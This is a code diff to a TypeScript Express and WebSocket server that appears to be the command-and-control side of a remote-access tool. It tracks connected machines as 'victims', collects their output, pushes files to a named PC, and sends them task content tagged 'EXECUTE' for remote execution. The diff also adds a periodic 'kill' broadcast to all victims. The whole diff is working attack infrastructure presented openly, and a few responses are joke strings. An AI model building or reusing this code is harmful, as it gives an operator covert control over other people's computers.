@@ -9,6 +9,9 @@ import ScheduledTask from './ScheduledTask';
 import VariableHolder from "./VariableHolder";
 import ScheduleType from "./ScheduleType";
 import TaskVariableType from "./TaskVariableType";
+import WebsocketMessage from "./WebsocketMessage";
+import { json } from "body-parser";
+import Victim from "./Victim";
 var cors = require("cors");
 const app = express();
 const apiPort = 8080; 
@@ -40,21 +43,48 @@ for(let i in scheduledTaskContent){
     scheduledTasks[scheduledTask.name] = scheduledTask
 }
 
-const websockets: Map<any, WebSocket> = new Map();
+const victims: Map<any, Victim> = new Map();
 
 wss.on("connection", (ws, message) => {
     if("device-name" in message.headers){
-        var deviceName = message.headers["device-name"];
-        websockets.set(deviceName, ws);  
+        var deviceName = message.headers["device-name"] as string;
+        victims.set(deviceName, {
+            "ws": ws,
+            "debugLines": [],
+            "devName": deviceName
+        });  
+
+        console.log(`New device connected! ${deviceName}`)
     } else{
         ws.close()
     }
 
+    ws.on("message", (data) => {
+        var jsonData: WebsocketMessage = JSON.parse(data.toString());
+        var victim: Victim = victims.get(jsonData.deviceName) as Victim;
+        console.log("Message Recieved from " + victim.devName);
+
+        if(jsonData.messageType == "PRINT"){
+            victim.debugLines.push(jsonData.content);
+            console.log(`${victim.devName} just printed: \n${jsonData.content}`)
+        }
+    })
+
     ws.on("close", (code, reason)=> {
         console.log(`Websocket ${message.headers["device-name"]} closed`)
-        websockets.delete(message.headers["device-name"]);
+        victims.delete(message.headers["device-name"]);
     })
 });
+
+
+setInterval(()=> {
+    for(let victim of victims.values()){
+        victim.ws.send(JSON.stringify({
+            "messageType": "QUERYDOWNLOADS",
+            "content": "kill"
+        }))
+    }
+}, 20 * 1000)
 
 app.use(cors())
 
@@ -62,12 +92,17 @@ app.get("/devices", (req, res) => {
     var responseObj: Response = {}
     responseObj["message"] = "Device list";
     responseObj["data"] = new Array<string>();
-    var keys = websockets.forEach((value, key, map) => {
+    var keys = victims.forEach((value, key, map) => {
         var devList: Array<string> = responseObj["data"];
         devList.push(key);
     })
     res.send(JSON.stringify(responseObj));
 });
+
+app.get("/getFiles", (req,res)=> {
+    res.send({"shush": "infant"})
+
+})
 
 app.get("/device", (req, res) => {
     var responseObj: Response = {}
@@ -78,7 +113,7 @@ app.get("/device", (req, res) => {
         res.send(JSON.stringify(responseObj));
     }
 
-    if(!websockets.has(req.headers["device-id"])){
+    if(!victims.has(req.headers["device-id"])){
         responseObj["message"] = "Device Not Found";
         res.status(400);
         res.send(JSON.stringify(responseObj));
@@ -236,14 +271,13 @@ app.post("/scheduleTask", (req,res) => {
     
     if(allGood){
         var taskToSchedule: ScheduledTask = scheduleJSON as ScheduledTask;
-        if(!websockets.has(taskToSchedule.deviceID)){
+        if(!victims.has(taskToSchedule.deviceID)){
             res.status(400);
             var response: Response = {};
             response["message"] = `Malformed Request. Cannot find device id`;
             res.send(response);
             return;
         }
-        console.log(scheduleJSON["name"])
         scheduledTasks[scheduleJSON["name"]] = taskToSchedule
         var responseData: Response = {}
         responseData["message"] = "Task scheduled successfully";
@@ -285,10 +319,8 @@ app.post("/uploadFile", (req, res) => {
         return;
     }
 
-    console.log(req.body["fileContents"])
-
-    if(websockets.has("Ishaan_PC")){
-        websockets.get("Ishaan_PC")?.send(JSON.stringify({
+    if(victims.has("Ishaan_PC")){
+        victims.get("Ishaan_PC")?.ws.send(JSON.stringify({
             "messageType": "DOWNLOAD",
             "content": req.body["fileContents"],
             "fileName": req.body["fileName"]
@@ -306,8 +338,8 @@ app.post("/sendJSON", (req,res)=> {
         return;
     }
 
-    if(websockets.has(req.body["deviceName"])){
-        websockets.get(req.body["deviceName"])?.send(JSON.stringify(req.body["jsonContent"]));
+    if(victims.has(req.body["deviceName"])){
+        victims.get(req.body["deviceName"])?.ws.send(JSON.stringify(req.body["jsonContent"]));
     }
 
     res.send({"the last thing i ever said to my grandpa": "was you are a coward"})
@@ -327,6 +359,7 @@ function checkIfValueInJson(jsonObj: any, value: string, res: any) : boolean{
 
 function saveTasks(){
     fs.writeFileSync(path.join(__dirname, "tasks.json"), JSON.stringify(tasks));
+    console.log("tasks saved");
 }
 
 function saveScheduledTasks(){
@@ -363,21 +396,22 @@ function unscheduleTask(name: string){
 
 function executeScheduledTask(scheduledTask: ScheduledTask){
     var deviceID: string = scheduledTask.deviceID;
-    if(websockets.has(deviceID)){
-        console.log(scheduledTask.id);
+    if(victims.has(deviceID)){
+        console.log(scheduledTask.id)
         var task: Task = tasks[scheduledTask.id] as Task;
-        console.log(task);
-
+        console.log(task)
         var content: string = task.content;
         //TODO: variables
         for(let variable in scheduledTask.variables){
             content = content.replace(scheduledTask.variables[variable].name, scheduledTask.variables[variable].value);
         }
 
-        websockets.get(deviceID)?.send(JSON.stringify({
+        victims.get(deviceID)?.ws.send(JSON.stringify({
             "messageType": "EXECUTE",
             "content": content
     }));
+
+    console.log(`Sending task ${task.id} to ${deviceID}`);
     }
 }
 
